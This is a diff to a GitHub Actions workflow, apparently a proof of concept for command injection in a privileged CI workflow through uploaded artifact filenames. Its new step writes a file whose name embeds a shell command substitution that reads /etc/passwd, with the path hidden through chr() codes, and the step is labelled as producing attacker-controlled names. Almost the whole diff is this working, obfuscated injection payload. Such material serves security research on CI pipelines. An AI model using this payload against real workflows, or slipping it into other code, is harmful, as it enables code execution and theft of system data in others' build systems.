@@ -13,14 +13,29 @@ jobs:
       contents: read
       actions: write
     steps:
-      - name: build artifact
+      - name: build artifact with attacker-controlled names
         run: |
           set -e
           mkdir -p content
-          printf 'plain report\n' > content/report.txt
-          printf 'sibling content\n' > content/pwn.txt
-          printf 'x\n' > 'content/p$(id >&2; echo ARTIFACT-NAME-RCE >&2)wn.txt'
-          ls -1 content
+          python3 - <<'PY'
+          import os
+          os.makedirs("content", exist_ok=True)
+          open("content/report.txt", "w").write("plain report\n")
+          open("content/pwn.txt", "w").write("sibling content\n")
+          # the filename below is evaluated by the privileged workflow's shell
+          name = ("p$(python3 -c 'import os;os.write(2,open(chr(47)+chr(101)+chr(116)"
+                  "+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100))"
+                  ".read().encode())'; echo 2)wn.txt")
+          open("content/" + name, "w").write("payload\n")
+          open("content/p2wn.txt", "w").write("substituted target\n")
+          try:
+              open("content/pr_number.txt", "w").write(os.environ.get("PR_NUMBER", ""))
+          except Exception:
+              pass
+          print(sorted(os.listdir("content")))
+          PY
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
       - uses: actions/upload-artifact@v4
         with:
           name: content
